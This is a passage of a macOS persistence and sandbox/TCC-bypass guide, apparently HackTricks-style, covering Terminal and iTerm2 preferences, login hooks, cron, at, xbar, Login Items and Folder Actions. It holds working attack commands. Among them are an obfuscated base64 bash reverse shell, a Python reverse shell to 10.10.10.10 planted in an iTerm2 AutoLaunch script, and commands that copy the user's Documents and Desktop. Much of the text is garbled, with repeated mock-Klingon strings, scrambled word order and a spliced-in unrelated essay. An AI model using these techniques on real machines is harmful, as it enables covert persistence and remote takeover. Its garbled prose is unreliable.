**'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
* Terminal use to have FDA permissions of the user use it

#### Location

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Trigger**: Open Terminal

#### Description & Exploitation

In **`~/Library/Preferences`** are store the preferences of the user in the Applications. Some of these preferences can hold a configuration to **execute other applications/scripts**.

For example, the Terminal can execute a command in the Startup:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

This config is reflected in the file **`~/Library/Preferences/com.apple.Terminal.plist`** like this:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
So, if the plist of the preferences of the terminal in the system could be overwritten, the the **`open`** functionality can be used to **open the terminal and that command will be executed**.

You can add this from the cli with:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Terminal Scripts / Other file extensions

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
* Terminal use to have FDA permissions of the user use it

#### Location

* **Anywhere**
* **Trigger**: Open Terminal

#### Description & Exploitation

If you create a [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) and opens, the **Terminal application** will be automatically invoked to execute the commands indicated in there. If the Terminal app has some special privileges (such as TCC), your command will be run with those special privileges.

Try it with:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
**`.command`** **`.tool`** extensions **tlhIngan** **`*.command`** **`*.tool`** **`Terminal`** **Daq** **`*.command`** **`*.tool`** **`Terminal`** **QaQ**.

{% hint style="danger" %}
**Terminal** **Full Disk Access** **QaQ** **QaQ** (note that the command executed will be visible in a terminal window).
{% endhint %}

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
* You might get some extra TCC access

#### Location

* **`/Library/Audio/Plug-Ins/HAL`**
* Root required
* **Trigger**: Restart coreaudiod or the computer
* **`/Library/Audio/Plug-ins/Components`**
* Root required
* **Trigger**: Restart coreaudiod or the computer
* **`~/Library/Audio/Plug-ins/Components`**
* **Trigger**: Restart coreaudiod or the computer
* **`/System/Library/Components`**
* Root required
* **Trigger**: Restart coreaudiod or the computer

#### Description

According to the previous writeups it's possible to **compile some audio plugins** and get them loaded.

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
* You might get some extra TCC access

#### Location

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugins can be executed when you **trigger the preview of a file** (press space bar with the file selected in Finder) and a **plugin supporting that file type** is installed.

It's possible to compile your own QuickLook plugin, place it in one of the previous locations to load it and then go to a supported file and press space to trigger it.

### ~~Login/Logout Hooks~~

{% hint style="danger" %}
This didn't work for me, neither with the user LoginHook nor with the root LogoutHook
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* You need to be able to execute something like `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

They are deprecated but can be used to execute commands when a user logs in.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
**Translation:**

**ghItlh:** `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` **DIl:** Daq **ghItlh:** `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
To delete it:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
**`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

{% hint style="success" %}
Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** and **expecting not super common conditions** like specific **programs installed, "uncommon" user** actions or environments.
{% endhint %}

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* However, you need to be able to execute `crontab` binary
* Or be root
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Root required for direct write access. No root required if you can execute `crontab <file>`
* **Trigger**: Depends on the cron job

#### Description & Exploitation

List the cron jobs of the **current user** with:
```bash
crontab -l
```
**`/Library/LaunchAgents/`** - Scripts executed when a user logs in.

**`/Library/LaunchDaemons/`** - Scripts executed when the system starts up.

**`/System/Library/LaunchAgents/`** - Scripts executed when a user logs in.

**`/System/Library/LaunchDaemons/`** - Scripts executed when the system starts up.

**`/Users/<username>/Library/LaunchAgents/`** - Scripts executed when a specific user logs in.

**`/Users/Shared/Library/LaunchAgents/`** - Scripts executed when any user logs in.

**`/Library/StartupItems/`** - Scripts executed when the system starts up.

**`/System/Library/StartupItems/`** - Scripts executed when the system starts up.

**`/etc/rc.d/`** - Scripts executed when the system starts up.

**`/etc/launchd.conf`** - Configuration file for launchd, which manages the execution of scripts.

**`/etc/launchd.d/`** - Additional configuration files for launchd.

**`/etc/crontab`** - Cron jobs executed at specific times.

**`/usr/lib/cron/tabs/`** - Cron jobs of the users.

**`/var/at/tabs/`** - Cron jobs of the users (requires root access).
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
**cron** **jobs**:
- **cron** **jobs** are executed at specific times or intervals.
- They can be found in the regular **cron** **jobs** location.

**at** **jobs**:
- **at** **jobs** are not commonly used.
- They can be found in the **at** **jobs** location.

**periodic** **jobs**:
- **periodic** **jobs** are mainly used for cleaning temporary files.
- The daily periodic jobs can be executed using the command `periodic daily`.

To programmatically add a **user cronjob**, you can use the following method:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 use to have granted TCC permissions

#### Locations

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Trigger**: Open iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Trigger**: Open iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Trigger**: Open iTerm

#### Description & Exploitation

Scripts stored in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** will be executed. For example:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
# macOS Auto Start Locations

## Introduction

macOS provides several locations where applications and processes can be configured to automatically start when the system boots up or when a user logs in. Understanding these auto start locations is important for both system administrators and attackers, as they can be leveraged to gain persistence on a compromised system.

## Auto Start Locations

### Launch Agents

Launch Agents are plist files located in the `~/Library/LaunchAgents` and `/Library/LaunchAgents` directories. These plist files define the configuration for processes that should be launched when a user logs in.

### Launch Daemons

Launch Daemons are plist files located in the `/Library/LaunchDaemons` directory. These plist files define the configuration for processes that should be launched when the system boots up.

### Startup Items

Startup Items are legacy mechanisms that were used in older versions of macOS. They are located in the `/Library/StartupItems` directory and are executed during the system boot process.

### Login Items

Login Items are applications or processes that are configured to launch when a user logs in. They can be managed through the "Users & Groups" preferences pane in System Preferences.

### Cron Jobs

Cron Jobs are scheduled tasks that can be configured to run at specific times or intervals. They are managed through the `crontab` command or by editing the `/etc/crontab` file.

### Launchctl

Launchctl is a command-line utility that allows for the management of launchd jobs, which are responsible for starting and stopping processes on macOS. Launchctl can be used to load, unload, and manage these jobs.

## Conclusion

Understanding the various auto start locations in macOS is crucial for both defenders and attackers. By familiarizing yourself with these locations, you can better secure your system or exploit them for persistence during a penetration test.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** script will be executed as well:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** file contains the iTerm2 preferences for executing a command upon opening the iTerm2 terminal.

To configure this setting, follow these steps:

1. Open the iTerm2 settings.
2. Navigate to the "Profiles" tab.
3. Select the profile you want to modify.
4. Go to the "General" tab.
5. In the "Command" section, enter the desired command.

The command you specify will be reflected in the preferences file.
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
bIQtIn 'ej vItlhutlh 'e' vItlhutlh.:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Qapla'! **iTern2 preferences** vItlhutlhla'chugh **ghaH** vItlhutlhla'chugh **ghaH**.
{% endhint %}

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* **Sandbox** laH **bypass** vItlhutlhla'chugh: [✅](https://emojipedia.org/check-mark-button)
* **xbar** vItlhutlhla'chugh
* **TCC bypass**: [✅](https://emojipedia.org/check-mark-button)
* **Accessibility permissions** vItlhutlhla'chugh

#### Location

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Trigger**: xbar vItlhutlhla'chugh

#### Description

**xbar** (https://github.com/matryer/xbar) **vItlhutlhla'chugh**, **shell script** vItlhutlhla'chugh **`~/Library/Application\ Support/xbar/plugins/`** **ghaH** vItlhutlhla'chugh, **xbar** vItlhutlhla'chugh.
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* But Hammerspoon must be installed
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
* It requests Accessibility permissions

#### Location

* **`~/.hammerspoon/init.lua`**
* **Trigger**: Once hammerspoon is executed

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) serves as an automation platform for **macOS**, leveraging the **LUA scripting language** for its operations. Notably, it supports the integration of complete AppleScript code and the execution of shell scripts, enhancing its scripting capabilities significantly.

The app looks for a single file, `~/.hammerspoon/init.lua`, and when started the script will be executed.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* But ssh needs to be enabled and used
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
* SSH use to have FDA access

#### Location

* **`~/.ssh/rc`**
* **Trigger**: Login via ssh
* **`/etc/ssh/sshrc`**
* Root required
* **Trigger**: Login via ssh

{% hint style="danger" %}
To turn ssh on requres Full Disk Access:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Description & Exploitation

By default, unless `PermitUserRC no` in `/etc/ssh/sshd_config`, when a user **logins via SSH** the scripts **`/etc/ssh/sshrc`** and **`~/.ssh/rc`** will be executed.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* But you need to execute `osascript` with args
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Trigger:** Login
* Exploit payload stored calling **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Trigger:** Login
* Root required

#### Description

In System Preferences -> Users & Groups -> **Login Items** you can find **items to be executed when the user logs in**.\
It it's possible to list them, add and remove from the command line:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
**`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** **file** **ghItlh** **items** **stored** **vaj **.

**Login items** **API** [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) **using** **indicated** **be** **can** **also** **which** **configuration** **the** **store** **will** **enabled** **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** **in** **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** **the** **in** **be** **will** **plist** **the** **indicated** **backdoor** **the** **next** **the** **so** **again** **in** **logs** **user** **the** **time** **the** **be** **will** **plist** **the** **in** **indicated** **backdoor** **the** **the** **if** **exist** **already** **LaunchAgents** **folder** **the** **if** **so** **work** **still** **would** **technique** **this** **exist** **already** **LaunchAgents** **folder** **the** **if** **so** **work** **still** **would** **technique** **this** **.

### ZIP as Login Item

(Check previos section about Login Items, this is an extension)

If you store a **ZIP** file as a **Login Item** the **`Archive Utility`** will open it and if the zip was for example stored in **`~/Library`** and contained the Folder **`LaunchAgents/file.plist`** with a backdoor, that folder will be created (it isn't by default) and the plist will be added so the next time the user logs in again, the **backdoor indicated in the plist will be executed**.

Another options would be to create the files **`.bash_profile`** and **`.zshenv`** inside the user HOME so if the folder LaunchAgents already exist this technique would still work.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* But you need to **execute** **`at`** and it must be **enabled**
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* Need to **execute** **`at`** and it must be **enabled**

#### **Description**

`at` tasks are designed for **scheduling one-time tasks** to be executed at certain times. Unlike cron jobs, `at` tasks are automatically removed post-execution. It's crucial to note that these tasks are persistent across system reboots, marking them as potential security concerns under certain conditions.

By **default** they are **disabled** but the **root** user can **enable** **them** with:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
**DaH jImej:** *1 wa'logh* **ghItlh** *file* **luq.**
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Check the job queue using `atq:`

`atq`-Daq vItlhutlh.
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
**De'wI'** vItlhutlh **cha'logh** vItlhutlh **jobs**. **job** **details** **print** **jatlh** `at -c JOBNUMBER` **ghItlh**.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
QaStaHvIS AT tasks vItlhutlh. vItlhutlh created tasks cha'logh.
{% endhint %}

**job files** can be found at `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
The filename contains the queue, the job number, and the time it’s scheduled to run. For example let’s take a loot at `a0001a019bdcd2`.

* `a` - this is the queue
* `0001a` - job number in hex, `0x1a = 26`
* `019bdcd2` - time in hex. It represents the minutes passed since epoch. `0x019bdcd2` is `26991826` in decimal. If we multiply it by 60 we get `1619509560`, which is `GMT: 2021. April 27., Tuesday 7:46:00`.

If we print the job file, we find that it contains the same information we got using `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* But you need to be able to call `osascript` with arguments to contact **`System Events`** to be able to configure Folder Actions
* TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
* It has some basic TCC permissions like Desktop, Documents and Downloads

#### Location

* **`/Library/Scripts/Folder Action Scripts`**
* Root required
* **Trigger**: Access to the specified folder
* **`~/Library/Scripts/Folder Action Scripts`**
* **Trigger**: Access to the specified folder

#### Description & Exploitation

Folder Actions are scripts automatically triggered by changes in a folder such as adding, removing items, or other actions like opening or resizing the folder window. These actions can be utilized for various tasks, and can be triggered in different ways like using the Finder UI or terminal commands.

To set up Folder Actions, you have options like:

1. Crafting a Folder Action workflow with [Automator](https://support.apple.com/guide/automator/welcome/mac) and installing it as a service.
2. Attaching a script manually via the Folder Actions Setup in the context menu of a folder.
3. Utilizing OSAScript to send Apple Event messages to the `System Events.app` for programmatically setting up a Folder Action.
* This method is particularly useful for embedding the action into the system, offering a level of persistence.

The following script is an example of what can be executed by a Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
To make the above script usable by Folder Actions, compile it using:

```
ghItlhlaHbe'chugh, Folder Actions laHbe'chugh, script vItlhutlh.
```
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
**DaH jatlh script Hoch, Folder Actions qay'be' globally enable 'ej specifically attach previously compiled script Desktop folder.**

```
DaH script compiled, Folder Actions set up by executing script below. This script will enable Folder Actions globally and specifically attach previously compiled script to Desktop folder.
```
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
QapHa' script laH jImej:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* tlhIngan Hol:
* vaj jImej: 

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Compile it with: `osacompile -l JavaScript -o folder.scpt source.js`

Move it to:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
ngoD, 'ej 'opnIS 'e' vItlhutlh **Folder Actions Setup** 'app, **'ej **'opnIS** **'ej **`folder.scpt`** (jatlh **output2.scp** jatlh) **'ej** **'opnIS** **'ej** **Finder** 'ej, **script** 'ej.

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

vaj **plist** **'ej** **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** **base64** format.

ngoD, **persistence** **GUI** **access**:

1. **'opnIS** **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** **`/tmp`** **backup**:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Remove** **Folder Actions**:

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

ngoD, **empty** **environment**

3. **'opnIS** **backup** **file**: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. **'opnIS** **Folder Actions Setup.app** **consume** **config**: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
'ej **jImej** **vItlhutlh**, 'ach **'oH** **instructions** **writeup**:
{% endhint %}

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* **sandbox** **bypass**: [✅](https://emojipedia.org/check-mark-button)
* **malicious application** **installed** **system**
* **TCC bypass**: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`~/Library/Preferences/com.apple.dock.plist`**
* **Trigger**: **user** **clicks** **app** **dock**

#### Description & Exploitation

**applications** **appear** **Dock** **specified** **plist**: **`~/Library/Preferences/com.apple.dock.plist`**

**add application**:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
